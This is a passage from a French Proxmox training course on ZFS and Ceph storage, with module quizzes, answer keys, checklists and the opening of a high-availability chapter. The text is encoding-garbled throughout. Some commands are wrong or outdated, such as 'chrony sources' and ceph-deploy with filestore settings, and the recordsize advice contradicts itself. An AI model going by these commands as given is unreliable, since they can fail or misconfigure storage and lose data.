â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚â”‚
â”‚  â”‚  â”‚tank/vm-disksâ”‚ â”‚tank/backups â”‚ â”‚tank/iso     â”‚â”‚â”‚
â”‚  â”‚  â”‚ 800GB       â”‚ â”‚ 600GB       â”‚ â”‚ 100GB       â”‚â”‚â”‚
â”‚  â”‚  â”‚compression  â”‚ â”‚deduplicationâ”‚ â”‚ readonly    â”‚â”‚â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

FonctionnalitÃ©s intÃ©grÃ©es :
âœ“ Checksums sur toutes les donnÃ©es
âœ“ Auto-rÃ©paration (self-healing)
âœ“ Snapshots instantanÃ©s
âœ“ Compression transparente
âœ“ DÃ©duplication
âœ“ Chiffrement natif
```

### Types de vdev et niveaux RAID

**Mirror** : RÃ©plication exacte des donnÃ©es sur 2+ disques

```bash
# CrÃ©ation pool avec mirror
zpool create tank mirror /dev/sda /dev/sdb

# Avantages :
# - Performance lecture excellente
# - TolÃ©rance panne : n-1 disques
# - Reconstruction rapide

# InconvÃ©nients :
# - EfficacitÃ© stockage : 50%
# - CoÃ»t Ã©levÃ©
```

**RAIDZ1** : Ã‰quivalent RAID5 avec 1 disque de paritÃ©

```bash
# CrÃ©ation pool RAIDZ1 (minimum 3 disques)
zpool create tank raidz1 /dev/sda /dev/sdb /dev/sdc

# Avantages :
# - EfficacitÃ© stockage : (n-1)/n
# - TolÃ©rance : 1 disque
# - CoÃ»t modÃ©rÃ©

# InconvÃ©nients :
# - Performance Ã©criture rÃ©duite
# - Reconstruction lente
# - Risque pendant reconstruction
```

**RAIDZ2** : Ã‰quivalent RAID6 avec 2 disques de paritÃ©

```bash
# CrÃ©ation pool RAIDZ2 (minimum 4 disques)
zpool create tank raidz2 /dev/sda /dev/sdb /dev/sdc /dev/sdd

# RecommandÃ© pour production :
# - EfficacitÃ© stockage : (n-2)/n
# - TolÃ©rance : 2 disques
# - SÃ©curitÃ© Ã©levÃ©e
```

### Configuration ZFS dans Proxmox

**Installation et configuration initiale :**

```bash
# ZFS est intÃ©grÃ© dans Proxmox, configuration via interface web ou CLI

# CrÃ©ation pool ZFS
zpool create -o ashift=12 \
    -O compression=lz4 \
    -O atime=off \
    -O xattr=sa \
    -O dnodesize=auto \
    tank raidz2 /dev/sda /dev/sdb /dev/sdc /dev/sdd

# Optimisations pour virtualisation
zfs set primarycache=metadata tank
zfs set recordsize=64K tank
zfs set sync=disabled tank  # Attention : risque de perte de donnÃ©es

# Ajout du stockage dans Proxmox
pvesm add zfspool tank --pool tank --content images,rootdir
```

**Datasets et propriÃ©tÃ©s :**

```bash
# CrÃ©ation datasets spÃ©cialisÃ©s
zfs create tank/vm-disks
zfs create tank/backups
zfs create tank/templates

# Configuration propriÃ©tÃ©s par dataset
zfs set compression=lz4 tank/vm-disks
zfs set compression=gzip-9 tank/backups
zfs set dedup=on tank/backups
zfs set readonly=on tank/templates

# Quotas et rÃ©servations
zfs set quota=500G tank/vm-disks
zfs set reservation=100G tank/vm-disks
```

### Snapshots et clones ZFS

**Snapshots ZFS** sont instantanÃ©s, cohÃ©rents, et ne consomment de l'espace que pour les modifications ultÃ©rieures.

```bash
# CrÃ©ation snapshot
zfs snapshot tank/vm-disks@backup-$(date +%Y%m%d-%H%M)

# Liste des snapshots
zfs list -t snapshot

# Restauration depuis snapshot
zfs rollback tank/vm-disks@backup-20241201-1200

# Envoi snapshot vers autre systÃ¨me
zfs send tank/vm-disks@backup-20241201 | ssh remote-host zfs receive backup-tank/vm-disks

# Clonage (copie modifiable d'un snapshot)
zfs clone tank/vm-disks@backup-20241201 tank/vm-test
```

**Automatisation des snapshots :**

```bash
# Script de snapshots automatiques
#!/bin/bash
DATASET="tank/vm-disks"
RETENTION_DAYS=7

# CrÃ©ation snapshot
zfs snapshot ${DATASET}@auto-$(date +%Y%m%d-%H%M)

# Nettoyage anciens snapshots
for snap in $(zfs list -H -o name -t snapshot | grep ${DATASET}@auto- | head -n -${RETENTION_DAYS}); do
    zfs destroy $snap
done

# Crontab : snapshots toutes les 4 heures
# 0 */4 * * * /usr/local/bin/zfs-auto-snapshot.sh
```

### Compression et dÃ©duplication

**Compression ZFS** rÃ©duit l'espace utilisÃ© sans impact significatif sur les performances grÃ¢ce aux algorithmes optimisÃ©s.

```bash
# Algorithmes de compression disponibles
# lz4 : Rapide, ratio modÃ©rÃ© (recommandÃ©)
# gzip-1 Ã  gzip-9 : Ratio Ã©levÃ©, plus lent
# zstd : Ã‰quilibre moderne

# Configuration compression
zfs set compression=lz4 tank/vm-disks
zfs set compression=zstd tank/backups

# VÃ©rification efficacitÃ©
zfs get compressratio tank/vm-disks
```

**DÃ©duplication** Ã©limine les blocs de donnÃ©es identiques, particuliÃ¨rement efficace pour les environnements avec beaucoup de donnÃ©es similaires.

```bash
# Activation dÃ©duplication (consomme beaucoup de RAM)
zfs set dedup=on tank/backups

# VÃ©rification ratio dÃ©duplication
zpool get dedupratio tank

# Estimation RAM nÃ©cessaire : 1GB RAM pour 1TB de donnÃ©es dÃ©dupliquÃ©es
```

### Monitoring et maintenance ZFS

**Surveillance de l'Ã©tat du pool :**

```bash
# Ã‰tat gÃ©nÃ©ral du pool
zpool status tank

# Statistiques dÃ©taillÃ©es
zpool iostat tank 1

# Utilisation espace
zfs list -o space tank

# VÃ©rification intÃ©gritÃ© (scrub)
zpool scrub tank
zpool status tank  # Progression du scrub
```

**Maintenance prÃ©ventive :**

```bash
# Scrub automatique mensuel
# 0 2 1 * * /sbin/zpool scrub tank

# Monitoring erreurs
zpool status | grep -E "(DEGRADED|FAULTED|OFFLINE|errors)"

# Remplacement disque dÃ©faillant
zpool replace tank /dev/sdb /dev/sde

# Optimisation fragmentation
zpool online -e tank /dev/sda  # Expansion aprÃ¨s remplacement
```

### Optimisation des performances ZFS

**ParamÃ¨tres de performance critiques :**

```bash
# ARC (Adaptive Replacement Cache) - RAM cache
echo 8589934592 > /sys/module/zfs/parameters/zfs_arc_max  # 8GB max

# Record size optimal selon usage
zfs set recordsize=128K tank/vm-disks    # VMs
zfs set recordsize=1M tank/backups      # Gros fichiers
zfs set recordsize=16K tank/databases   # Bases de donnÃ©es

# Optimisations SSD
zfs set primarycache=metadata tank  # Cache mÃ©tadonnÃ©es uniquement
zfs set logbias=throughput tank     # Optimise dÃ©bit vs latence
```

**L2ARC et ZIL sur SSD :**

```bash
# Ajout cache L2ARC (lecture)
zpool add tank cache /dev/nvme0n1p1

# Ajout ZIL/SLOG (Ã©criture synchrone)
zpool add tank log /dev/nvme0n1p2

# VÃ©rification
zpool status tank
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure de production :** Configurez ZFS avec RAIDZ2 pour la redondance, compression lz4 pour l'efficacitÃ©, et snapshots automatiques pour la protection des donnÃ©es. Utilisez des SSD pour L2ARC et ZIL pour optimiser les performances.

**Environnement de sauvegarde :** Exploitez la dÃ©duplication et compression gzip-9 pour maximiser l'efficacitÃ© du stockage. Configurez la rÃ©plication ZFS vers un site distant pour la continuitÃ© d'activitÃ©.

**Laboratoire de dÃ©veloppement :** Utilisez les clones ZFS pour crÃ©er rapidement des environnements de test identiques. Les snapshots permettent de revenir instantanÃ©ment Ã  un Ã©tat stable aprÃ¨s les tests.

---

## 4.4 Ceph et stockage distribuÃ©

### Ceph : Architecture du stockage software-defined

**Ceph** rÃ©volutionne le stockage distribuÃ© en Ã©liminant les points de dÃ©faillance unique et en offrant une scalabilitÃ© quasi-illimitÃ©e. Cette solution software-defined transforme des serveurs standards en infrastructure de stockage enterprise-grade, capable de gÃ©rer des pÃ©taoctets de donnÃ©es avec auto-rÃ©paration et rÃ©partition automatique.

Imaginez Ceph comme une **colonie de fourmis intelligentes** : chaque nÅ“ud (fourmi) connaÃ®t l'Ã©tat global du cluster et peut prendre des dÃ©cisions autonomes pour maintenir l'intÃ©gritÃ© et la disponibilitÃ© des donnÃ©es, mÃªme si d'autres nÅ“uds disparaissent.

### Architecture Ceph complÃ¨te

```
Cluster Ceph 3 nÅ“uds :

Node 1 (proxmox1)          Node 2 (proxmox2)          Node 3 (proxmox3)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Proxmox VE    â”‚       â”‚   Proxmox VE    â”‚       â”‚   Proxmox VE    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph Monitor    â”‚â—„â”€â”€â”€â”€â”€â–ºâ”‚ Ceph Monitor    â”‚â—„â”€â”€â”€â”€â”€â–ºâ”‚ Ceph Monitor    â”‚
â”‚ (MON)           â”‚       â”‚ (MON)           â”‚       â”‚ (MON)           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph Manager    â”‚       â”‚ Ceph Manager    â”‚       â”‚ Ceph Manager    â”‚
â”‚ (MGR)           â”‚       â”‚ (MGR) - Standby â”‚       â”‚ (MGR) - Standby â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph OSD.0      â”‚       â”‚ Ceph OSD.1      â”‚       â”‚ Ceph OSD.2      â”‚
â”‚ /dev/sdb (1TB)  â”‚       â”‚ /dev/sdb (1TB)  â”‚       â”‚ /dev/sdb (1TB)  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Ceph OSD.3      â”‚       â”‚ Ceph OSD.4      â”‚       â”‚ Ceph OSD.5      â”‚
â”‚ /dev/sdc (1TB)  â”‚       â”‚ /dev/sdc (1TB)  â”‚       â”‚ /dev/sdc (1TB)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                         â”‚                         â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                   â”‚
                          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                          â”‚ Cluster Map â”‚
                          â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
                          â”‚ â”‚ Pool RBDâ”‚ â”‚
                          â”‚ â”‚ Size: 3 â”‚ â”‚
                          â”‚ â”‚ Min: 2  â”‚ â”‚
                          â”‚ â”‚ 6TB raw â”‚ â”‚
                          â”‚ â”‚ 2TB net â”‚ â”‚
                          â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
                          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Composants Ceph :
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Monitor  â”‚ Maintient la carte du cluster          â”‚
â”‚ (MON)    â”‚ Consensus quorum (nombre impair)        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Manager  â”‚ Monitoring, mÃ©triques, interface web    â”‚
â”‚ (MGR)    â”‚ Un actif, autres en standby             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ OSD      â”‚ Stockage des donnÃ©es, rÃ©plication       â”‚
â”‚          â”‚ Un par disque, auto-rÃ©paration          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ MDS      â”‚ MÃ©tadonnÃ©es CephFS (optionnel)          â”‚
â”‚          â”‚ NÃ©cessaire uniquement pour CephFS       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Installation Ceph dans Proxmox

**PrÃ©requis et prÃ©paration :**

```bash
# VÃ©rification rÃ©seau (latence < 5ms recommandÃ©e)
ping -c 10 proxmox2
ping -c 10 proxmox3

# Synchronisation temps (critique pour Ceph)
systemctl enable --now chrony
chrony sources -v

# PrÃ©paration disques (effacement sÃ©curisÃ©)
wipefs -a /dev/sdb
wipefs -a /dev/sdc
```

**Installation via interface Proxmox :**

```bash
# 1. Initialisation cluster Ceph (nÅ“ud 1)
# Datacenter > Ceph > Install
# Configuration rÃ©seau dÃ©diÃ© recommandÃ©e

# 2. CrÃ©ation monitors (quorum impair)
# Ceph > Monitor > Create
# RÃ©pÃ©ter sur les 3 nÅ“uds

# 3. CrÃ©ation manager
# Ceph > Manager > Create

# 4. CrÃ©ation OSDs
# Ceph > OSD > Create
# SÃ©lectionner disques /dev/sdb, /dev/sdc sur chaque nÅ“ud
```

**Installation CLI (alternative) :**

```bash
# Installation packages Ceph
apt update && apt install -y ceph-common

# Initialisation cluster
ceph-deploy new proxmox1 proxmox2 proxmox3

# Configuration ceph.conf
echo "osd pool default size = 3" >> ceph.conf
echo "osd pool default min size = 2" >> ceph.conf
echo "osd pool default pg num = 128" >> ceph.conf

# DÃ©ploiement monitors
ceph-deploy mon create-initial

# DÃ©ploiement OSDs
ceph-deploy osd create --data /dev/sdb proxmox1
ceph-deploy osd create --data /dev/sdc proxmox1
# RÃ©pÃ©ter pour proxmox2 et proxmox3

# DÃ©ploiement managers
ceph-deploy mgr create proxmox1 proxmox2 proxmox3
```

### Pools et Placement Groups

**Pools** organisent les donnÃ©es avec des rÃ¨gles de rÃ©plication et de placement spÃ©cifiques. Chaque pool dÃ©finit sa stratÃ©gie de redondance et ses performances.

```bash
# CrÃ©ation pool pour VMs
ceph osd pool create vm-pool 128 128

# Configuration rÃ©plication
ceph osd pool set vm-pool size 3      # 3 copies
ceph osd pool set vm-pool min_size 2  # Minimum 2 copies pour Ã©criture

# Activation RBD
ceph osd pool application enable vm-pool rbd

# CrÃ©ation pool pour sauvegardes (rÃ©plication rÃ©duite)
ceph osd pool create backup-pool 64 64
ceph osd pool set backup-pool size 2
ceph osd pool set backup-pool min_size 1
```

**Placement Groups (PG)** dÃ©terminent comment les donnÃ©es sont distribuÃ©es dans le cluster. Le nombre de PG impacte directement les performances et la distribution.

```bash
# Calcul optimal PG : (OSDs Ã— 100) / rÃ©plication / pools
# Exemple : (6 OSDs Ã— 100) / 3 rÃ©plication / 2 pools = 100 PG par pool

# Ajustement nombre PG
ceph osd pool set vm-pool pg_num 128
ceph osd pool set vm-pool pgp_num 128

# VÃ©rification distribution
ceph pg dump | grep -E "^pg_stat"
```

### CRUSH Map et rÃ¨gles de placement

**CRUSH (Controlled Replication Under Scalable Hashing)** dÃ©termine intelligemment oÃ¹ placer les donnÃ©es selon la topologie du cluster et les rÃ¨gles dÃ©finies.

```bash
# Visualisation CRUSH map
ceph osd tree

# Exemple sortie :
# ID CLASS WEIGHT  TYPE NAME          STATUS
# -1       6.00000 root default
# -3       2.00000     host proxmox1
#  0   ssd 1.00000         osd.0         up
#  3   ssd 1.00000         osd.3         up
# -5       2.00000     host proxmox2
#  1   ssd 1.00000         osd.1         up
#  4   ssd 1.00000         osd.4         up
# -7       2.00000     host proxmox3
#  2   ssd 1.00000         osd.2         up
#  5   ssd 1.00000         osd.5         up

# CrÃ©ation rÃ¨gle personnalisÃ©e (rÃ©plication par rack)
ceph osd crush rule create-replicated rack-rule default rack ssd

# Application rÃ¨gle Ã  un pool
ceph osd pool set vm-pool crush_rule rack-rule
```

### RBD : RADOS Block Device

**RBD** fournit des volumes bloc distribuÃ©s pour les machines virtuelles, avec snapshots, clonage, et redimensionnement Ã  chaud.

```bash
# CrÃ©ation image RBD
rbd create --size 100G vm-pool/vm-101-disk-0

# Liste images
rbd ls vm-pool

# Informations dÃ©taillÃ©es
rbd info vm-pool/vm-101-disk-0

# Redimensionnement Ã  chaud
rbd resize --size 150G vm-pool/vm-101-disk-0

# Snapshots RBD
rbd snap create vm-pool/vm-101-disk-0@snapshot-$(date +%Y%m%d)
rbd snap ls vm-pool/vm-101-disk-0

# Clonage (nÃ©cessite snapshot protÃ©gÃ©)
rbd snap protect vm-pool/vm-101-disk-0@snapshot-20241201
rbd clone vm-pool/vm-101-disk-0@snapshot-20241201 vm-pool/vm-102-disk-0
```

### Monitoring et maintenance Ceph

**Surveillance de l'Ã©tat du cluster :**

```bash
# Ã‰tat global cluster
ceph status
ceph health detail

# Utilisation espace
ceph df
ceph osd df

# Performance temps rÃ©el
ceph -w  # Mode watch

# Statistiques dÃ©taillÃ©es
ceph osd perf
ceph osd pool stats
```

**Maintenance prÃ©ventive :**

```bash
# VÃ©rification intÃ©gritÃ© donnÃ©es (scrub)
ceph pg scrub 1.0  # Scrub PG spÃ©cifique
ceph osd deep-scrub osd.0  # Deep scrub OSD

# RÃ©Ã©quilibrage manuel
ceph osd reweight 0 0.8  # RÃ©duire poids OSD.0

# Maintenance OSD (sortie temporaire)
ceph osd set noout  # EmpÃªcher rÃ©Ã©quilibrage
ceph osd out 0      # Sortir OSD.0
# Maintenance hardware
ceph osd in 0       # Remettre OSD.0
ceph osd unset noout
```

### Optimisation des performances Ceph

**Tuning rÃ©seau :**

```bash
# Configuration rÃ©seau dÃ©diÃ©
# /etc/ceph/ceph.conf
[global]
public_network = 192.168.1.0/24
cluster_network = 10.0.0.0/24  # RÃ©seau dÃ©diÃ© rÃ©plication

# Optimisations rÃ©seau
echo 'net.core.rmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.core.wmem_max = 134217728' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_rmem = 4096 87380 134217728' >> /etc/sysctl.conf
```

**Optimisations OSD :**

```bash
# Configuration OSD pour SSD
[osd]
osd_op_threads = 8
osd_disk_threads = 4
osd_journal_size = 10240  # 10GB journal
filestore_max_sync_interval = 5
filestore_min_sync_interval = 0.01
```

**Monitoring avancÃ© :**

```bash
# Installation Prometheus + Grafana
ceph mgr module enable prometheus
# Dashboard Grafana disponible sur port 3000

# MÃ©triques clÃ©s Ã  surveiller :
# - Latence I/O (< 10ms)
# - IOPS par OSD
# - Utilisation rÃ©seau cluster
# - Taux d'erreur PG
```

### Cas d'usage spÃ©cialisÃ©s

**Infrastructure cloud privÃ© :** DÃ©ployez Ceph avec des pools diffÃ©renciÃ©s par performance (SSD pour VMs critiques, HDD pour stockage froid). Configurez des rÃ¨gles CRUSH pour distribuer les donnÃ©es selon la gÃ©ographie ou les racks.

**Sauvegarde et archivage :** Utilisez des pools avec rÃ©plication rÃ©duite (size=2) pour optimiser l'espace de stockage. ImplÃ©mentez des politiques de lifecycle pour migrer automatiquement les donnÃ©es anciennes vers du stockage moins coÃ»teux.

**Environnement de dÃ©veloppement :** Exploitez les snapshots et clones RBD pour crÃ©er rapidement des environnements de test. Configurez des pools dÃ©diÃ©s avec des performances adaptÃ©es aux besoins de dÃ©veloppement.

---


## Quiz Module 3 : RÃ©seau Virtuel

**Question 1 :** Dans un bridge VLAN-aware, quelle configuration permet Ã  une VM d'accÃ©der au VLAN 20 ?
a) bridge-vids 20
b) tag=20 dans la configuration VM
c) vlan-raw-device 20
d) bridge-ports vlan20

**Question 2 :** Le mode de bonding 802.3ad (LACP) nÃ©cessite :
a) Seulement la configuration serveur
b) Configuration serveur + switch compatible
c) Uniquement des interfaces identiques
d) Un nombre pair d'interfaces

**Question 3 :** Virtio-net offre de meilleures performances que e1000 car :
a) Il Ã©mule mieux le hardware
b) Il utilise la paravirtualisation
c) Il supporte plus de VLAN
d) Il consomme moins de RAM

**Question 4 :** SR-IOV permet :
a) D'augmenter le nombre de VLAN
b) L'accÃ¨s direct hardware pour les VM
c) De crÃ©er plus de bridges
d) D'amÃ©liorer la sÃ©curitÃ© rÃ©seau

**Question 5 :** La hash policy layer3+4 rÃ©partit le trafic selon :
a) Les adresses MAC
b) Les adresses IP uniquement
c) Les adresses IP + ports
d) Le round-robin

**RÃ©ponses :** 1-b, 2-b, 3-b, 4-b, 5-c

---

## Quiz Module 4 : Stockage

**Question 1 :** LVM-Thin permet :
a) D'amÃ©liorer les performances IOPS
b) L'allocation d'espace Ã  la demande
c) De chiffrer les donnÃ©es
d) De crÃ©er des RAID logiciels

**Question 2 :** En ZFS, un snapshot :
a) Consomme immÃ©diatement l'espace du volume
b) Ne consomme de l'espace que pour les modifications
c) NÃ©cessite un disque dÃ©diÃ©
d) Ralentit les performances

**Question 3 :** Dans Ceph, les Placement Groups (PG) :
a) Stockent les mÃ©tadonnÃ©es
b) DÃ©terminent la distribution des donnÃ©es
c) GÃ¨rent l'authentification
d) ContrÃ´lent la bande passante

**Question 4 :** Le niveau RAIDZ2 en ZFS tolÃ¨re la perte de :
a) 1 disque
b) 2 disques
c) 3 disques
d) 50% des disques

**Question 5 :** L'avantage principal du stockage distribuÃ© est :
a) Les performances maximales
b) La simplicitÃ© de configuration
c) L'Ã©limination des SPOF
d) Le coÃ»t rÃ©duit

**RÃ©ponses :** 1-b, 2-b, 3-b, 4-b, 5-c

---

## Bonnes Pratiques Modules 3-4

### RÃ©seau Virtuel
- [ ] Utiliser des bridges VLAN-aware pour la flexibilitÃ©
- [ ] ImplÃ©menter le bonding LACP pour la redondance
- [ ] SÃ©parer les flux avec des VLAN dÃ©diÃ©s (mgmt, storage, VM)
- [ ] PrivilÃ©gier virtio-net pour les performances
- [ ] Configurer SR-IOV pour les applications critiques
- [ ] Monitorer la bande passante et les erreurs rÃ©seau
- [ ] Documenter le plan d'adressage VLAN

### Stockage
- [ ] Choisir la technologie selon les besoins (local vs distribuÃ©)
- [ ] Utiliser LVM-Thin pour l'efficacitÃ© d'espace
- [ ] ImplÃ©menter des snapshots rÃ©guliers
- [ ] Configurer la compression ZFS (lz4 recommandÃ©)
- [ ] Dimensionner Ceph avec minimum 3 nÅ“uds
- [ ] SÃ©parer rÃ©seau public/cluster pour Ceph
- [ ] Surveiller l'utilisation et les performances
- [ ] Tester rÃ©guliÃ¨rement les procÃ©dures de restauration

---

# Module 5 : Haute DisponibilitÃ© et Clustering

## 5.1 Concepts de clustering

### Philosophie de la haute disponibilitÃ©

La **haute disponibilitÃ© (HA)** vise Ã  maintenir les services opÃ©rationnels mÃªme en cas de dÃ©faillance de composants individuels. Cette approche transforme l'infrastructure d'un ensemble de points de dÃ©faillance unique en un systÃ¨me rÃ©silient capable de s'auto-rÃ©parer et de maintenir la continuitÃ© de service.

Imaginez un cluster comme un **orchestre symphonique professionnel** : si un musicien tombe malade, un remplaÃ§ant prend immÃ©diatement sa place sans que le public ne s'en aperÃ§oive. Le chef d'orchestre (gestionnaire de cluster) coordonne l'ensemble et s'assure que la musique continue, mÃªme si plusieurs musiciens doivent Ãªtre remplacÃ©s simultanÃ©ment.

La haute disponibilitÃ© ne se limite pas Ã  la redondance hardware ; elle englobe la conception d'applications, la gestion des donnÃ©es, la surveillance proactive, et les procÃ©dures de rÃ©cupÃ©ration automatisÃ©es. L'objectif est d'atteindre des niveaux de disponibilitÃ© de 99.9% (8.76 heures d'arrÃªt par an) Ã  99.999% (5.26 minutes d'arrÃªt par an).

### Types de clustering

**Clustering Actif/Passif** maintient des nÅ“uds de secours qui prennent le relais en cas de dÃ©faillance du nÅ“ud principal. Cette approche simple garantit la continuitÃ© mais n'optimise pas l'utilisation des ressources.

```
Cluster Actif/Passif :

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Node 1        â”‚    â”‚   Node 2        â”‚
â”‚   (ACTIF)       â”‚    â”‚   (PASSIF)      â”‚
â”‚                 â”‚    â”‚                 â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Service A   â”‚ â”‚    â”‚ â”‚ Service A   â”‚ â”‚
â”‚ â”‚ (Running)   â”‚ â”‚    â”‚ â”‚ (Stopped)   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚    â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚ â”‚ Service B   â”‚ â”‚    â”‚ â”‚ Service B   â”‚ â”‚
â”‚ â”‚ (Running)   â”‚ â”‚    â”‚ â”‚ (Stopped)   â”‚ â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚    â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
         â”‚                       â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              Heartbeat/Quorum

Avantages :
âœ“ SimplicitÃ© de configuration
âœ“ Basculement prÃ©visible
âœ“ Isolation complÃ¨te des services

InconvÃ©nients :
âœ— Gaspillage de ressources (50%)
âœ— Temps de basculement (30s-2min)
âœ— Pas de rÃ©partition de charge
```

**Clustering Actif/Actif** distribue la charge entre tous les nÅ“uds disponibles, maximisant l'utilisation des ressources et offrant une meilleure scalabilitÃ©.

```
